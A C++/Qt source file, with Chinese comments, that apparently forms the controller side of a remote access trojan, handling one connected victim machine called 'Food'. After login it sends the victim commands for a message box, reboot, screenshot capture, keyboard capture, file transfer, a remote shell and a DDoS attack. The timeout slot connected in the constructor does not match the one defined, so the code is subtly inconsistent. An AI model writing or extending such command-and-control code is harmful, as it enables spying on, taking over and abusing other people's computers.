#include "food.h"

Food::Food(QTcpSocket *sock, QObject *parent) : QObject(parent), mId(-1)
{
    // 设置socket
    mSock = new TcpSocket(sock, this);
    // 绑定信号
    connect(mSock, SIGNAL(newData()), this, SLOT(newData()));
    connect(mSock, SIGNAL(disconnected()), this, SLOT(disconnected()));

    // 设置计时器来判断客户是否登入，如果没就断开连接
    mLoginTimeout = new QTimer(this);
    connect(mLoginTimeout, SIGNAL(timeout()), this, SLOT(clientLoginTimeout()));
    mLoginTimeout->start(10*1000);
}

void Food::closeAndDelete()
{
    // 输出信息
    qDebug() << mSock->socket()->peerAddress().toString() << ":"
             << mSock->socket()->peerPort() << " 已经断开服务端";

    mSock->close();
    deleteLater();
}

void Food::sendCmdSendBox(QString &text)
{
    QString data;
    data.append(CmdSendBox+CmdSplit);
    data.append("TEXT"+CmdSplit+text);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdReboot()
{
    QString data;
    data.append(CmdReboot+CmdSplit);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdOffline()
{
    QString data;
    data.append(CmdOffline+CmdSplit);
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdSnapshoot(int port)
{
    QString data;
    data.append(CmdSnapshoot+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdKeybd(int port)
{
    QString data;
    data.append(CmdKeybd+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdFile(int port)
{
    QString data;
    data.append(CmdFile+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdShell(int port)
{
    QString data;
    data.append(CmdShell+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::sendCmdDdos(int port)
{
    QString data;
    data.append(CmdDdos+CmdSplit);
    data.append("PORT"+CmdSplit+QString::number(port));
    data.append(CmdEnd);
    mSock->write(data.toLocal8Bit());
}

void Food::processCommand(QByteArray &cmd, QByteArray &args)
{
    cmd = cmd.toUpper().trimmed(); // 预处理 大写后取头尾空格等
    QHash<QByteArray, QByteArray> hashArgs = parseArgs(args);

    // 登入指令
    if (cmd == CmdLogin && mId == -1) {
        doLogin(hashArgs);
        return;
    }
}

QHash<QByteArray, QByteArray> Food::parseArgs(QByteArray &args)
{
    QList<QByteArray> listArgs = args.split(CmdSplit[0]);

    // 分解参数，然后把它加入哈希表
    QHash<QByteArray, QByteArray> hashArgs;
    for(int i=0; i<listArgs.length()-1 ; i+=2) {
        hashArgs.insert(listArgs[i].toUpper().trimmed(),
                        listArgs[i+1].trimmed());
    }

    return hashArgs;
}

void Food::doLogin(QHash<QByteArray, QByteArray> &args)
{
    // 发射登录信号
    QString userName = args["USER_NAME"];
    QString system = args["SYSTEM"];
    QString ip = mSock->socket()->peerAddress().toString();
    int port = mSock->socket()->peerPort();
    emit login(this, userName, ip, port, system);

    // 输出信息
    qDebug() << ip << ":" << port << " 已经登入服务端";
}

void Food::foodLoginTimeout()
{
    if (mId == -1) {
        closeAndDelete();
    }
}

void Food::disconnected()
{
    if (mId >= 0) {
        emit logout(mId);
    }

    closeAndDelete();
}

void Food::newData()
{
    // 从socket里获取缓存区
    QByteArray *buf = mSock->buffer();



    //如有需要可以对buf区中data进行解密


    int endIndex;
    while ((endIndex = buf->indexOf(CmdEnd)) > -1) {
        // 提取一行指令
        QByteArray data = buf->mid(0, endIndex);
        buf->remove(0, endIndex + CmdEnd.length());

        // 提取指令和参数
        QByteArray cmd, args;
        int argIndex = data.indexOf(CmdSplit);
        if (argIndex == -1) {
            cmd = data;
        } else {
            cmd = data.mid(0, argIndex);
            args = data.mid(argIndex+CmdSplit.length(), data.length());
        }

        // 处理指令
        processCommand(cmd, args);
    }
}
